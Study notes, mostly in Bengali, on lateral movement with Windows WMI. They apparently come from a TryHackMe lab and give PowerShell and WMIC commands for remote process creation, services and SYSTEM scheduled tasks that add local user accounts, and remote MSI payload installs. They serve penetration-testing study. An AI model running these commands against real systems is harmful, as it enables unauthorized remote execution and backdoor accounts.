# **Moving Laterally Using WMI**

## **1. What is WMI?**

**WMI (Windows Management Instrumentation)** হলো Windows-এর management technology, যা **WBEM (Web-Based Enterprise Management)** standard implement করে।

- এটি network-এর বিভিন্ন device-এর management information access করতে দেয়।
- Administrator-রা standard management task করতে WMI ব্যবহার করে।
- Attacker এই functionality abuse করে lateral movement করতে পারে।

## **2. Connecting to WMI From PowerShell**

প্রথমে username ও password দিয়ে `PSCredential` object তৈরি করতে হবে।

```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

### **WMI Connection Protocol**

WMI session তৈরি করতে দুটি protocol ব্যবহার করা যায়:

| Protocol  | Ports                                             |
| --------- | ------------------------------------------------- |
| **DCOM**  | `135/TCP`, `49152-65535/TCP`                      |
| **Wsman** | `5985/TCP` (WinRM HTTP), `5986/TCP` (WinRM HTTPS) |

**WMI session তৈরি:**

```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

- `New-CimSessionOption` → Connection option ও protocol configure করে।
- `New-CimSession` → Credentials ও options ব্যবহার করে remote WMI session তৈরি করে।
- `$Session` → পরবর্তী technique-গুলোতে ব্যবহার হবে।

## **3. Remote Process Creation Using WMI**

- **Ports:** `135/TCP`, `49152-65535/TCP`, `5985/TCP`, `5986/TCP`
- **Required Group:** `Administrators`

`Win32_Process` class-এর `Create` method দিয়ে remote process চালানো যায়।

```
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

- Command remote machine-এ execute হবে।
- WMI command-এর output দেখায় না, তবে process silently তৈরি করে।

**Legacy system-এ WMIC:**

```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

## **4. Creating Services Remotely with WMI**

- **Ports:** `135/TCP`, `49152-65535/TCP`, `5985/TCP`, `5986/TCP`
- **Required Group:** `Administrators`

`Win32_Service` class-এর `Create` method দিয়ে remote service তৈরি করা যায়।

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

**Service খুঁজে বের করা ও চালু করা:**

```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

**Stop ও delete:**

```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## **5. Creating Scheduled Tasks Remotely with WMI**

- **Ports:** `135/TCP`, `49152-65535/TCP`, `5985/TCP`, `5986/TCP`
- **Required Group:** `Administrators`

PowerShell-এর Scheduled Task cmdlet ব্যবহার করে remote task তৈরি ও execute করা যায়।

```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

- Payload-কে `Command` ও `Args`-এ আলাদা করতে হবে।
- Task `NT AUTHORITY\SYSTEM` হিসেবে চলবে।

**Task delete:**

```
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## **6. Installing MSI Packages through WMI**

- **Ports:** `135/TCP`, `49152-65535/TCP`, `5985/TCP`, `5986/TCP`
- **Required Group:** `Administrators`
- MSI হলো installer file format।
- MSI package target system-এ copy করতে হবে।
- এরপর WMI-এর `Win32_Product` class-এর `Install` method ব্যবহার করে install করা যায়।

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

**Legacy system-এ WMIC:**

```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\windows\myinstaller.msi
```

## **Quick Revision**

| Technique        | WMI Class / Method          | কাজ                       |
| ---------------- | --------------------------- | ------------------------- |
| Remote Process   | `Win32_Process` / `Create`  | Remote process চালানো     |
| Remote Service   | `Win32_Service` / `Create`  | Service তৈরি              |
| Scheduled Task   | Scheduled Task cmdlets      | Remote task তৈরি ও চালানো |
| MSI Installation | `Win32_Product` / `Install` | Remote MSI install        |

**মনে রাখবে:**

- WMI → Windows management task remotely execute করে।
- `PSCredential` → Remote authentication credentials।
- `CimSession` → Remote WMI connection।
- DCOM → `135`, `49152-65535`।
- Wsman → `5985`, `5986`।
- MSI → `Win32_Product` দিয়ে install করা যায়।
